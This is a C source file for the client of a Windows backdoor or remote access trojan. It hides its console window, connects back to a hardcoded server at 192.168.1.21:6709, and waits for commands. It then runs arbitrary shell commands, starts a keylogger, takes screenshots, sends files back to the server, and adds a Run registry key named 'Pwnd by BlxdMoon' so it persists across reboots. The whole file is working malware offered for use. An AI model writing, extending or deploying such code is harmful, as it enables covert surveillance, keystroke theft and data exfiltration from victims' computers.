#include "status.h"
#include "logger.h"
#include "screen.h"
#include "str_cut.h"

#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#include <WinUser.h>
#include <wininet.h>
#include <windowsx.h>
#include <sys/stat.h>
#include <sys/types.h>

// Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

#define bzero(p, size) (void)memset((p), 0, (size))

// Define Socket
int sock;

int bootRun()
{
  // Initialize variables
  char err[128] = "Failed to create Persistence.\n";
  char suc[128] = "Successfully added Persistence at: Computer\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
  TCHAR szPath[MAX_PATH];
  DWORD pathLen = 0;

  pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);

  if (pathLen == 0)
  {
    // An error occurred
    send(sock, err, sizeof(err), 0);
    return -1;
  }

  // Handle to open registry key
  HKEY NewVal;

  // Open regkey
  if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS)
  {
    // An other error occurred
    send(sock, err, sizeof(err), 0);
    return -1;
  }

  DWORD pathLenInBytes = pathLen * sizeof(*szPath);
  if (RegSetValueEx(NewVal, TEXT("Pwnd by BlxdMoon"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS)
  {
    // Couldn't create key
    RegCloseKey(NewVal);
    send(sock, err, sizeof(err), 0);
    return -1;
  }

  // Successfully added Persistence
  RegCloseKey(NewVal);
  send(sock, suc, sizeof(suc), 0);

  return 0;
}

void Shell()
{
  // The command which we receive from the server
  char buffer[1024];
  char container[1024];
  char total_response[18384];

  while (1)
  {
    // Clear variables
    bzero(buffer, sizeof(buffer));
    bzero(container, sizeof(container));
    bzero(total_response, sizeof(total_response));

    // Receive command from server
    recv(sock, buffer, 1024, 0);

    if (strcmp("q", buffer) == 0) // Use strncmp for comparing a specific number of characters
    {
      // info("Quitting Connection..");
      closesocket(sock);
      WSACleanup();
      exit(0);
    }
    else if (strcmp("keylogger:start", buffer) == 0)
    {
      // info("Starting Keylogger..");

      // Create a thread to run logger
      HANDLE thread = CreateThread(NULL, 0, logger, NULL, 0, NULL);

      // Continue listening for commands
      continue;
    }
    else if (strncmp("cd ", buffer, 3) == 0)
    {
      // Get the directory from the original buffer
      char *str = str_cut(buffer, 3, 100);

      // Change directory
      chdir(str);

      // Send response
      send(sock, "Directory changed.\n", sizeof("Directory changed."), 0);
    }
    else if (strncmp("screen", buffer, 6) == 0)
    {
      // Build base path for screens dir
      char BASE_PATH[256]; // Allocate memory for BASE_PATH
      sprintf(BASE_PATH, "C:\\Users\\%s\\AppData\\Local\\Temp\\screen", getenv("USERNAME"));

      if (mkdir(BASE_PATH) != 0)
      {
      }

      // Build new path for single screenshot
      char *UUID = generate_uuid();
      char SCREENSHOT_FILE[256]; // Allocate memory for SCREENSHOT_FILE
      sprintf(SCREENSHOT_FILE, "%s\\%s.bmp", BASE_PATH, UUID);

      // Capture screen
      screenCapture(0, 0, 1920, 1080, SCREENSHOT_FILE);

      char suc[128];
      sprintf(suc, "[+] Screenshot saved to: %s\n", SCREENSHOT_FILE);

      // Send back path of screenshot
      send(sock, suc, sizeof(suc), 0);
    }
    else if (strncmp("cf ", buffer, 3) == 0)
    {
      // Get the filename after cf
      char *filename = str_cut(buffer, 3, 100);

      // Read the file contents
      FILE *file;
      file = fopen(filename, "rb");

      // Check if file exists
      if (file == NULL)
      {
        // Send error message
        char err[128];
        sprintf(err, "[-] File %s not found.\n", filename);
        send(sock, err, sizeof(err), 0);
        continue;
      }

      // Get file size
      fseek(file, 0, SEEK_END);

      // Get file size
      int size = ftell(file);

      // Reset file pointer
      rewind(file);

      // Allocate memory for file contents
      char *file_contents = malloc(size * (sizeof(char)));

      // Read file contents
      fread(file_contents, sizeof(char), size, file);

      char rspns[18384];
      sprintf(rspns, "file:%d:%s:%s", size, filename, file_contents);

      // Send file contents
      send(sock, rspns, sizeof(rspns), 0);
    }
    else if (strncmp("persist", buffer, 7) == 0)
    {
      // Persist connection
      bootRun();
    }
    else
    {
      // Open a file description to execute system commands
      FILE *fp = _popen(buffer, "r");
      while (fgets(container, 1024, fp) != NULL)
      {
        // Concatenate response to total_response
        strcat(total_response, container);
      }

      // Send the response to the server
      // printf("%s", total_response); DEBUGGING PURPOSES
      send(sock, total_response, sizeof(total_response), 0);

      // Close fp
      fclose(fp);
    }
  }
}

// Function to establish the connection
int EstablishConnection(const char *ServIp, unsigned short ServPort)
{
  struct sockaddr_in ServAddr;

  // Initialize Socket (Use IPv4, TCP)
  sock = socket(AF_INET, SOCK_STREAM, 0);

  // Check if socket creation failed
  if (sock == INVALID_SOCKET)
  {
    // error("Socket creation failed");
    return 1;
  }

  // Clear
  memset(&ServAddr, 0, sizeof(ServAddr));

  // Reset config
  ServAddr.sin_family = AF_INET;
  ServAddr.sin_addr.S_un.S_addr = inet_addr(ServIp);
  ServAddr.sin_port = htons(ServPort);

  // Connect every 5 seconds
  while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0)
  {
    Sleep(5);
  }

  return 0; // Connection established successfully
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
  if (hPrev != 0)
  {
    // error("hPrev should be 0.");
    return 1;
  }

  // Run without showing CMD window
  HWND stealth;
  AllocConsole();
  stealth = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(stealth, 0);

  // Define variables
  char *ServIp = "192.168.1.21";
  unsigned short ServPort = 6709;

  // Check if WinSock is ready
  WSADATA wsaData;
  if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
  {
    // error("Couldn't initiate WinSock.");
    exit(1);
  }

  // Establish connection
  if (EstablishConnection(ServIp, ServPort) != 0)
  {
    // Handle connection failure
    // error("Coudln't establish connection.");
    return 1;
  }

  // Enter into Shell
  Shell();

  // Close the socket when done
  closesocket(sock);

  return 0;
}
